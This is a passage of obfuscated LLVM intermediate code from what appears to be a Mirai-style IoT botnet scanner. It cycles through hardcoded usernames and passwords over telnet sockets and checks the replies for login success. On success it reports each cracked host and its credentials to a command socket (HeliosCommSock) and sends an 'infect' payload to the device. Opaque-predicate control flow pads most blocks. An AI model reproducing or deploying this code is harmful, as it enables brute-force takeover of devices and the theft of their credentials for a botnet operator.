  br i1 %630, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %1104

; <label>:631:                                    ; preds = %124
  %632 = load i32, i32* @x.79
  %633 = load i32, i32* @y.80
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %631
  %640 = load i32, i32* %5, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 16
  %645 = load i32, i32* %3, align 4
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 9
  %650 = load i8*, i8** %649, align 8
  %651 = call i32 @read_until_response(i32 %644, i32 %645, i8* %650, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %652 = icmp ne i32 %651, 0
  %653 = load i32, i32* @x.79
  %654 = load i32, i32* @y.80
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %652, label %661, label %710

; <label>:661:                                    ; preds = %originalBBpart269
  %662 = load i32, i32* @x.79
  %663 = load i32, i32* @y.80
  %664 = sub i32 %662, 1
  %665 = mul i32 %662, %664
  %666 = urem i32 %665, 2
  %667 = icmp eq i32 %666, 0
  %668 = icmp slt i32 %663, 10
  %669 = or i1 %667, %668
  br i1 %669, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %661
  %670 = load i32, i32* %5, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 9
  %674 = load i8*, i8** %673, align 8
  %675 = call i32 @contains_fail(i8* %674)
  %676 = icmp ne i32 %675, 0
  %677 = load i32, i32* @x.79
  %678 = load i32, i32* @y.80
  %679 = sub i32 %677, 1
  %680 = mul i32 %677, %679
  %681 = urem i32 %680, 2
  %682 = icmp eq i32 %681, 0
  %683 = icmp slt i32 %678, 10
  %684 = or i1 %682, %683
  br i1 %684, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %676, label %685, label %689

; <label>:685:                                    ; preds = %originalBBpart273
  %686 = load i32, i32* %5, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %687
  call void @advance_state(%struct.telstate_t* %688, i32 0)
  br label %693

; <label>:689:                                    ; preds = %originalBBpart273
  %690 = load i32, i32* %5, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %691
  call void @advance_state(%struct.telstate_t* %692, i32 5)
  br label %693

; <label>:693:                                    ; preds = %689, %685
  %694 = load i32, i32* @x.79
  %695 = load i32, i32* @y.80
  %696 = sub i32 %694, 1
  %697 = mul i32 %694, %696
  %698 = urem i32 %697, 2
  %699 = icmp eq i32 %698, 0
  %700 = icmp slt i32 %695, 10
  %701 = or i1 %699, %700
  br i1 %701, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %693
  %702 = load i32, i32* @x.79
  %703 = load i32, i32* @y.80
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %1121

; <label>:710:                                    ; preds = %originalBBpart269
  %711 = load i32, i32* %5, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %712
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %713, i32 0, i32 7
  %715 = load i32, i32* %714, align 16
  %716 = add i32 %715, 3
  %717 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %718 = icmp ult i32 %716, %717
  br i1 %718, label %719, label %723

; <label>:719:                                    ; preds = %710
  %720 = load i32, i32* %5, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %721
  call void @reset_telstate(%struct.telstate_t* %722)
  br label %723

; <label>:723:                                    ; preds = %719, %710
  br label %1104

; <label>:724:                                    ; preds = %124
  %725 = load i32, i32* @x.79
  %726 = load i32, i32* @y.80
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %724
  %733 = load i32, i32* %5, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 0
  %737 = load i32, i32* %736, align 16
  %738 = load i32, i32* %5, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 5
  %742 = load i8, i8* %741, align 1
  %743 = zext i8 %742 to i64
  %744 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %743
  %745 = load i8*, i8** %744, align 8
  %746 = load i32, i32* %5, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 5
  %750 = load i8, i8* %749, align 1
  %751 = zext i8 %750 to i64
  %752 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %751
  %753 = load i8*, i8** %752, align 8
  %754 = call i64 @strlen(i8* %753) #10
  %755 = call i64 @send(i32 %737, i8* %745, i64 %754, i32 16384)
  %756 = icmp slt i64 %755, 0
  %757 = load i32, i32* @x.79
  %758 = load i32, i32* @y.80
  %759 = sub i32 %757, 1
  %760 = mul i32 %757, %759
  %761 = urem i32 %760, 2
  %762 = icmp eq i32 %761, 0
  %763 = icmp slt i32 %758, 10
  %764 = or i1 %762, %763
  br i1 %764, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %756, label %765, label %785

; <label>:765:                                    ; preds = %originalBBpart281
  %766 = load i32, i32* @x.79
  %767 = load i32, i32* @y.80
  %768 = sub i32 %766, 1
  %769 = mul i32 %766, %768
  %770 = urem i32 %769, 2
  %771 = icmp eq i32 %770, 0
  %772 = icmp slt i32 %767, 10
  %773 = or i1 %771, %772
  br i1 %773, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %765
  %774 = load i32, i32* %5, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %775
  call void @reset_telstate(%struct.telstate_t* %776)
  %777 = load i32, i32* @x.79
  %778 = load i32, i32* @y.80
  %779 = sub i32 %777, 1
  %780 = mul i32 %777, %779
  %781 = urem i32 %780, 2
  %782 = icmp eq i32 %781, 0
  %783 = icmp slt i32 %778, 10
  %784 = or i1 %782, %783
  br i1 %784, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %1121

; <label>:785:                                    ; preds = %originalBBpart281
  %786 = load i32, i32* @x.79
  %787 = load i32, i32* @y.80
  %788 = sub i32 %786, 1
  %789 = mul i32 %786, %788
  %790 = urem i32 %789, 2
  %791 = icmp eq i32 %790, 0
  %792 = icmp slt i32 %787, 10
  %793 = or i1 %791, %792
  br i1 %793, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %785
  %794 = load i32, i32* %5, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %795
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %796, i32 0, i32 0
  %798 = load i32, i32* %797, align 16
  %799 = call i64 @send(i32 %798, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %800 = icmp slt i64 %799, 0
  %801 = load i32, i32* @x.79
  %802 = load i32, i32* @y.80
  %803 = sub i32 %801, 1
  %804 = mul i32 %801, %803
  %805 = urem i32 %804, 2
  %806 = icmp eq i32 %805, 0
  %807 = icmp slt i32 %802, 10
  %808 = or i1 %806, %807
  br i1 %808, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br i1 %800, label %809, label %813

; <label>:809:                                    ; preds = %originalBBpart289
  %810 = load i32, i32* %5, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %811
  call void @reset_telstate(%struct.telstate_t* %812)
  br label %1121

; <label>:813:                                    ; preds = %originalBBpart289
  %814 = load i32, i32* %5, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %815
  call void @advance_state(%struct.telstate_t* %816, i32 6)
  br label %1104

; <label>:817:                                    ; preds = %124
  %818 = load i32, i32* @x.79
  %819 = load i32, i32* @y.80
  %820 = sub i32 %818, 1
  %821 = mul i32 %818, %820
  %822 = urem i32 %821, 2
  %823 = icmp eq i32 %822, 0
  %824 = icmp slt i32 %819, 10
  %825 = or i1 %823, %824
  br i1 %825, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %817
  %826 = load i32, i32* %5, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 0
  %830 = load i32, i32* %829, align 16
  %831 = load i32, i32* %3, align 4
  %832 = load i32, i32* %5, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %833
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %834, i32 0, i32 9
  %836 = load i8*, i8** %835, align 8
  %837 = call i32 @read_until_response(i32 %830, i32 %831, i8* %836, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %838 = icmp ne i32 %837, 0
  %839 = load i32, i32* @x.79
  %840 = load i32, i32* @y.80
  %841 = sub i32 %839, 1
  %842 = mul i32 %839, %841
  %843 = urem i32 %842, 2
  %844 = icmp eq i32 %843, 0
  %845 = icmp slt i32 %840, 10
  %846 = or i1 %844, %845
  br i1 %846, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br i1 %838, label %847, label %949

; <label>:847:                                    ; preds = %originalBBpart293
  %848 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %849 = load i32, i32* %5, align 4
  %850 = sext i32 %849 to i64
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %850
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %851, i32 0, i32 7
  store i32 %848, i32* %852, align 16
  %853 = load i32, i32* %5, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 9
  %857 = load i8*, i8** %856, align 8
  %858 = call i32 @contains_fail(i8* %857)
  %859 = icmp ne i32 %858, 0
  br i1 %859, label %860, label %864

; <label>:860:                                    ; preds = %847
  %861 = load i32, i32* %5, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %862
  call void @advance_state(%struct.telstate_t* %863, i32 0)
  br label %948

; <label>:864:                                    ; preds = %847
  %865 = load i32, i32* %5, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %866
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %867, i32 0, i32 9
  %869 = load i8*, i8** %868, align 8
  %870 = call i32 @contains_success(i8* %869)
  %871 = icmp ne i32 %870, 0
  br i1 %871, label %872, label %927

; <label>:872:                                    ; preds = %864
  %873 = load i32, i32* %5, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 3
  %877 = load i8, i8* %876, align 1
  %878 = zext i8 %877 to i32
  %879 = icmp eq i32 %878, 2
  br i1 %879, label %880, label %884

; <label>:880:                                    ; preds = %872
  %881 = load i32, i32* %5, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %882
  call void @advance_state(%struct.telstate_t* %883, i32 7)
  br label %910

; <label>:884:                                    ; preds = %872
  %885 = load i32, i32* @HeliosCommSock, align 4
  %886 = load i32, i32* %5, align 4
  %887 = sext i32 %886 to i64
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %887
  %889 = call i8* @get_telstate_host(%struct.telstate_t* %888)
  %890 = load i32, i32* %5, align 4
  %891 = sext i32 %890 to i64
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %891
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %892, i32 0, i32 4
  %894 = load i8, i8* %893, align 2
  %895 = zext i8 %894 to i64
  %896 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %895
  %897 = load i8*, i8** %896, align 8
  %898 = load i32, i32* %5, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 5
  %902 = load i8, i8* %901, align 1
  %903 = zext i8 %902 to i64
  %904 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %903
  %905 = load i8*, i8** %904, align 8
  %906 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %885, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.348, i32 0, i32 0), i8* %889, i8* %897, i8* %905)
  %907 = load i32, i32* %5, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %908
  call void @advance_state(%struct.telstate_t* %909, i32 7)
  br label %910

; <label>:910:                                    ; preds = %884, %880
  %911 = load i32, i32* @x.79
  %912 = load i32, i32* @y.80
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %910
  %919 = load i32, i32* @x.79
  %920 = load i32, i32* @y.80
  %921 = sub i32 %919, 1
  %922 = mul i32 %919, %921
  %923 = urem i32 %922, 2
  %924 = icmp eq i32 %923, 0
  %925 = icmp slt i32 %920, 10
  %926 = or i1 %924, %925
  br i1 %926, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %931

; <label>:927:                                    ; preds = %864
  %928 = load i32, i32* %5, align 4
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %929
  call void @reset_telstate(%struct.telstate_t* %930)
  br label %931

; <label>:931:                                    ; preds = %927, %originalBBpart297
  %932 = load i32, i32* @x.79
  %933 = load i32, i32* @y.80
  %934 = sub i32 %932, 1
  %935 = mul i32 %932, %934
  %936 = urem i32 %935, 2
  %937 = icmp eq i32 %936, 0
  %938 = icmp slt i32 %933, 10
  %939 = or i1 %937, %938
  br i1 %939, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %931
  %940 = load i32, i32* @x.79
  %941 = load i32, i32* @y.80
  %942 = sub i32 %940, 1
  %943 = mul i32 %940, %942
  %944 = urem i32 %943, 2
  %945 = icmp eq i32 %944, 0
  %946 = icmp slt i32 %941, 10
  %947 = or i1 %945, %946
  br i1 %947, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %948

; <label>:948:                                    ; preds = %originalBBpart2101, %860
  br label %1121

; <label>:949:                                    ; preds = %originalBBpart293
  %950 = load i32, i32* @x.79
  %951 = load i32, i32* @y.80
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %949
  %958 = load i32, i32* %5, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 7
  %962 = load i32, i32* %961, align 16
  %963 = add i32 %962, 7
  %964 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %965 = icmp ult i32 %963, %964
  %966 = load i32, i32* @x.79
  %967 = load i32, i32* @y.80
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBBpart2114, label %originalBB103alteredBB

originalBBpart2114:                               ; preds = %originalBB103
  br i1 %965, label %974, label %994

; <label>:974:                                    ; preds = %originalBBpart2114
  %975 = load i32, i32* @x.79
  %976 = load i32, i32* @y.80
  %977 = sub i32 %975, 1
  %978 = mul i32 %975, %977
  %979 = urem i32 %978, 2
  %980 = icmp eq i32 %979, 0
  %981 = icmp slt i32 %976, 10
  %982 = or i1 %980, %981
  br i1 %982, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %974
  %983 = load i32, i32* %5, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %984
  call void @reset_telstate(%struct.telstate_t* %985)
  %986 = load i32, i32* @x.79
  %987 = load i32, i32* @y.80
  %988 = sub i32 %986, 1
  %989 = mul i32 %986, %988
  %990 = urem i32 %989, 2
  %991 = icmp eq i32 %990, 0
  %992 = icmp slt i32 %987, 10
  %993 = or i1 %991, %992
  br i1 %993, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %994

; <label>:994:                                    ; preds = %originalBBpart2118, %originalBBpart2114
  br label %1104

; <label>:995:                                    ; preds = %124
  %996 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %997 = load i32, i32* %5, align 4
  %998 = sext i32 %997 to i64
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %998
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %999, i32 0, i32 7
  store i32 %996, i32* %1000, align 16
  %1001 = load i32, i32* %5, align 4
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1002
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1003, i32 0, i32 0
  %1005 = load i32, i32* %1004, align 16
  %1006 = call i64 @send(i32 %1005, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.349, i32 0, i32 0), i64 4, i32 16384)
  %1007 = icmp slt i64 %1006, 0
  br i1 %1007, label %1008, label %1025

; <label>:1008:                                   ; preds = %995
  %1009 = load i32, i32* @x.79
  %1010 = load i32, i32* @y.80
  %1011 = sub i32 %1009, 1
  %1012 = mul i32 %1009, %1011
  %1013 = urem i32 %1012, 2
  %1014 = icmp eq i32 %1013, 0
  %1015 = icmp slt i32 %1010, 10
  %1016 = or i1 %1014, %1015
  br i1 %1016, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %1008
  %1017 = load i32, i32* @x.79
  %1018 = load i32, i32* @y.80
  %1019 = sub i32 %1017, 1
  %1020 = mul i32 %1017, %1019
  %1021 = urem i32 %1020, 2
  %1022 = icmp eq i32 %1021, 0
  %1023 = icmp slt i32 %1018, 10
  %1024 = or i1 %1022, %1023
  br i1 %1024, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %1025

; <label>:1025:                                   ; preds = %originalBBpart2122, %995
  %1026 = load i32, i32* %5, align 4
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 0
  %1030 = load i32, i32* %1029, align 16
  %1031 = call i64 @send(i32 %1030, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.350, i32 0, i32 0), i64 7, i32 16384)
  %1032 = icmp slt i64 %1031, 0
  br i1 %1032, label %1033, label %1050

; <label>:1033:                                   ; preds = %1025
  %1034 = load i32, i32* @x.79
  %1035 = load i32, i32* @y.80
  %1036 = sub i32 %1034, 1
  %1037 = mul i32 %1034, %1036
  %1038 = urem i32 %1037, 2
  %1039 = icmp eq i32 %1038, 0
  %1040 = icmp slt i32 %1035, 10
  %1041 = or i1 %1039, %1040
  br i1 %1041, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %1033
  %1042 = load i32, i32* @x.79
  %1043 = load i32, i32* @y.80
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %1050

; <label>:1050:                                   ; preds = %originalBBpart2126, %1025
  %1051 = load i32, i32* %5, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 0
  %1055 = load i32, i32* %1054, align 16
  %1056 = load i8*, i8** @infect, align 8
  %1057 = load i8*, i8** @infect, align 8
  %1058 = call i64 @strlen(i8* %1057) #10
  %1059 = call i64 @send(i32 %1055, i8* %1056, i64 %1058, i32 16384)
  %1060 = icmp slt i64 %1059, 0
  br i1 %1060, label %1061, label %1065

; <label>:1061:                                   ; preds = %1050
  %1062 = load i32, i32* %5, align 4
  %1063 = sext i32 %1062 to i64
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1063
  call void @reset_telstate(%struct.telstate_t* %1064)
  br label %1121

; <label>:1065:                                   ; preds = %1050
  %1066 = load i32, i32* %5, align 4
  %1067 = sext i32 %1066 to i64
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1067
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1068, i32 0, i32 7
  %1070 = load i32, i32* %1069, align 16
  %1071 = add i32 %1070, 25
  %1072 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1073 = icmp ult i32 %1071, %1072
  br i1 %1073, label %1074, label %1087

; <label>:1074:                                   ; preds = %1065
  %1075 = load i32, i32* %5, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 3
  %1079 = load i8, i8* %1078, align 1
  %1080 = zext i8 %1079 to i32
  %1081 = icmp ne i32 %1080, 3
  br i1 %1081, label %1082, label %1083

; <label>:1082:                                   ; preds = %1074
  br label %1083

; <label>:1083:                                   ; preds = %1082, %1074
  %1084 = load i32, i32* %5, align 4
  %1085 = sext i32 %1084 to i64
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1085
  call void @reset_telstate(%struct.telstate_t* %1086)
  br label %1087

; <label>:1087:                                   ; preds = %1083, %1065
  %1088 = load i32, i32* @x.79
  %1089 = load i32, i32* @y.80
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %1087
  %1096 = load i32, i32* @x.79
  %1097 = load i32, i32* @y.80
  %1098 = sub i32 %1096, 1
  %1099 = mul i32 %1096, %1098
  %1100 = urem i32 %1099, 2
  %1101 = icmp eq i32 %1100, 0
  %1102 = icmp slt i32 %1097, 10
  %1103 = or i1 %1101, %1102
  br i1 %1103, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %1104

; <label>:1104:                                   ; preds = %originalBBpart2130, %994, %813, %723, %originalBBpart265, %537, %originalBBpart239, %314, %124
  %1105 = load i32, i32* @x.79
  %1106 = load i32, i32* @y.80
  %1107 = sub i32 %1105, 1
  %1108 = mul i32 %1105, %1107
  %1109 = urem i32 %1108, 2
  %1110 = icmp eq i32 %1109, 0
  %1111 = icmp slt i32 %1106, 10
  %1112 = or i1 %1110, %1111
  br i1 %1112, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %1104
  %1113 = load i32, i32* @x.79
  %1114 = load i32, i32* @y.80
  %1115 = sub i32 %1113, 1
  %1116 = mul i32 %1113, %1115
  %1117 = urem i32 %1116, 2
  %1118 = icmp eq i32 %1117, 0
  %1119 = icmp slt i32 %1114, 10
  %1120 = or i1 %1118, %1119
  br i1 %1120, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %1121

; <label>:1121:                                   ; preds = %originalBBpart2134, %1061, %948, %809, %originalBBpart285, %originalBBpart277, %607, %579, %507, %426, %422, %originalBBpart212, %216, %203
  %1122 = load i32, i32* @x.79
  %1123 = load i32, i32* @y.80
  %1124 = sub i32 %1122, 1
  %1125 = mul i32 %1122, %1124
  %1126 = urem i32 %1125, 2
  %1127 = icmp eq i32 %1126, 0
  %1128 = icmp slt i32 %1123, 10
  %1129 = or i1 %1127, %1128
  br i1 %1129, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %1121
  %1130 = load i32, i32* %5, align 4
  %1131 = add nsw i32 %1130, 1
  store i32 %1131, i32* %5, align 4
  %1132 = load i32, i32* @x.79
  %1133 = load i32, i32* @y.80
  %1134 = sub i32 %1132, 1
  %1135 = mul i32 %1132, %1134
  %1136 = urem i32 %1135, 2
  %1137 = icmp eq i32 %1136, 0
  %1138 = icmp slt i32 %1133, 10
  %1139 = or i1 %1137, %1138
  br i1 %1139, label %originalBBpart2142, label %originalBB136alteredBB

originalBBpart2142:                               ; preds = %originalBB136
  br label %91

; <label>:1140:                                   ; preds = %91
  %1141 = load i32, i32* @x.79
  %1142 = load i32, i32* @y.80
  %1143 = sub i32 %1141, 1
  %1144 = mul i32 %1141, %1143
  %1145 = urem i32 %1144, 2
  %1146 = icmp eq i32 %1145, 0
  %1147 = icmp slt i32 %1142, 10
  %1148 = or i1 %1146, %1147
  br i1 %1148, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1140
  %1149 = load i32, i32* @x.79
  %1150 = load i32, i32* @y.80
  %1151 = sub i32 %1149, 1
  %1152 = mul i32 %1149, %1151
  %1153 = urem i32 %1152, 2
  %1154 = icmp eq i32 %1153, 0
  %1155 = icmp slt i32 %1150, 10
  %1156 = or i1 %1154, %1155
  br i1 %1156, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %89
                                                  ; No predecessors!
  %1158 = load i32, i32* @x.79
  %1159 = load i32, i32* @y.80
  %1160 = sub i32 %1158, 1
  %1161 = mul i32 %1158, %1160
